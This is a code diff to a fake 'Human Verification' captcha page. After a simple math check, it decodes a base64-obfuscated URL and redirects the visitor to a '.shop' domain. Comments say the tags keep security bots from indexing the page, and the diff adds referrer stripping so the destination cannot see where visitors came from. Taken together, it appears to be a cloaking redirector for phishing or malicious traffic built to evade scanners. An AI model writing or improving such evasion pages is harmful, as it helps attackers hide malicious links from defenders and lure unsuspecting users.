@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- These tags prevent security bots from indexing your page -->
-    <meta name="robots" content="noindex, nofollow, noarchive">
+    <!-- CRITICAL: This tells the browser NOT to tell the next server where you came from -->
     <meta name="referrer" content="no-referrer">
+    <meta name="robots" content="noindex, nofollow, noarchive">
     <title>Checking...</title>
     <style>
         :root { --p: #2563eb; --t: #1e293b; }
@@ -21,7 +21,7 @@
         button { width:100%; background:var(--p); color:#fff; border:none; padding:14px; border-radius:8px; font-weight:600; cursor:pointer; transition:0.2s; }
         button:hover { background:#1d4ed8; }
         #err { color:#ef4444; font-size:0.8rem; margin-top:10px; display:none; }
-        .hp { position:absolute; left:-9999px; top:-9999px; } /* Honeypot */
+        .hp { position:absolute; left:-9999px; top:-9999px; } 
     </style>
 </head>
 <body>
@@ -39,43 +39,54 @@
         <div id="err">Incorrect. Please try again.</div>
     </div>
 
-    <button onclick="verify()">Verify & Continue</button>
+    <button id="vbtn" onclick="verify()">Verify & Continue</button>
 </div>
 
 <script>
-    // CORRECTED ENCODED LINK (Single .html)
+    // CORRECTED ENCODED LINK
     const _secret = "aHR0cHM6Ly9ibC5kYXNlNy5zaG9wLzd0cjIyNjczODYycjc0MzZyMjAzNDhyNjI0MzA3OHI2Mjc3ODQ2MDgyNjM2NTI4NzQ2MzU3NDMyMDkwNDM2NTI2MDM0ODUyNjQzNTAyNjM0NzgwMjMzNTIwMjYvMzkzMzQ1MzMyNmtqamRzYnZmdnZremZhZGZ4di5odG1s";
 
-    // Random Math
     const v1 = Math.floor(Math.random() * 8) + 2;
     const v2 = Math.floor(Math.random() * 5) + 1;
     const result = v1 + v2;
 
-    // Set UI
     document.getElementById('q-text').innerText = v1 + " + " + v2 + " = ?";
     
-    // Change Title after 1 second
     setTimeout(() => { document.title = "Human Verification"; }, 1000);
 
     function verify() {
         const userAns = document.getElementById('ans_input').value;
         const botTrap = document.getElementById('bot_check').value;
         const errMsg = document.getElementById('err');
+        const btn = document.getElementById('vbtn');
 
-        // Bot behavior check
         if (botTrap !== "") return; 
 
         if (parseInt(userAns) === result) {
-            // Success - Decode and Redirect
-            document.querySelector('button').innerText = "Redirecting...";
-            window.location.href = atob(_secret);
+            btn.innerText = "Redirecting...";
+            btn.disabled = true;
+
+            // THE FIX: Create a "clean" redirect that strips the referrer
+            const target = atob(_secret);
+            const meta = document.createElement('meta');
+            meta.name = "referrer";
+            meta.content = "no-referrer";
+            document.getElementsByTagName('head')[0].appendChild(meta);
+
+            // Use a slight delay and location.replace to act like a manual entry
+            setTimeout(() => {
+                const a = document.createElement('a');
+                a.href = target;
+                a.rel = 'noreferrer';
+                a.click();
+            }, 500);
+
         } else {
             errMsg.style.display = 'block';
-            document.getElementById('answer').value = "";
+            document.getElementById('ans_input').value = "";
         }
     }
 
-    // Enter key support
     document.getElementById('ans_input').addEventListener('keypress', (e) => {
         if (e.key === 'Enter') verify();
     });
